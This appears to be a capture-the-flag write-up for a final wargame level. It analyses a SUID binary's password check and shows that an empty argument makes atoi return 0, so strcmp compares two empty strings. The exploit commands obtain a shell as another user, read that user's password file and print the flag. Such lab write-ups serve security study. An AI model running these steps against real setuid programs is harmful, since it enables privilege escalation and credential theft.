# Bonus 3

Same recon as level0: SUID **end**. Final level.

## Analysis

```c
int main(int argc, char **argv) {
    char buffer[132];
    FILE *fp = fopen("/home/user/end/.pass", "r");
    if (!fp || argc != 2) return -1;

    fread(buffer, 1, 66, fp);
    buffer[65] = 0;
    buffer[atoi(argv[1])] = 0;            // null byte at attacker-chosen index
    fread(buffer + 66, 1, 65, fp);
    if (strcmp(buffer, argv[1]) == 0)     // compare buffer to our own argument
        execl("/bin/sh", "sh", (char *)0);
    else
        puts(buffer + 66);
}
```

`buffer` holds the real password (read from a file only `end` can open), and `buffer[atoi(argv[1])] = 0` drops a null byte at whatever index we ask for, anywhere in `buffer`. To get a shell, the string that results, the real password truncated at that index, has to equal `argv[1]` itself. That is circular: `argv[1]` would have to be both a correct prefix of a password we cannot read and a number whose `atoi()` equals that prefix's own length.

## Exploit

Sidestep the whole circle with `N = 0`: pass `argv[1] = ""`.

- `atoi("")` returns 0, not an error. There is no libc exception for "not a number", it just falls back to 0:

```
$ python -c "int('')"
Traceback (most recent call last):
ValueError: invalid literal for int() with base 10: ''
$ python -c "
import ctypes
libc = ctypes.CDLL('libc.so.6')
libc.atoi.restype = ctypes.c_int
print libc.atoi('')
"
0
```

  Python's `int()` is strict and raises on this input; C's `atoi()` is not, and quietly returns 0 for anything it cannot parse. That gap is what makes `N = 0` reachable from an empty argument in the first place.

- `atoi("") == 0` means `buffer[0] = 0`, truncating `buffer` to the empty string.
- `strcmp("", "")` is `0`: two empty strings are always equal, no matter what the real password is.

So `argv[1] = ""` compares the empty string to itself and always passes, without ever needing to know a single byte of the actual password. Two things make `""` the *only* string that works:

```
$ ./bonus3 "abc"        # atoi("abc") is also 0, but argv[1] itself is "abc"
$ echo $?
0                        # buffer[0]=0 truncates buffer to "", but strcmp("", "abc") != 0, no shell

$ ./bonus3 "" "extra"    # a second argument makes argc == 3
$ echo $?
255                      # argc != 2, returns -1 before touching buffer at all
```

`"abc"` reaches the same `atoi() == 0` outcome but fails `strcmp` because `argv[1]` itself is not empty; only `argv[1] = ""` makes both sides of the comparison the same string. And `argc != 2` requires exactly one argument, so `./bonus3 ""` (one empty argument, `argc == 2`) is the only invocation that reaches a shell.

```bash
$ ./bonus3 ""
id
uid=2013(bonus3) gid=2013(bonus3) euid=2014(end) egid=100(users) groups=2014(end),100(users),2013(bonus3)
cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```

Flag: `3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c`
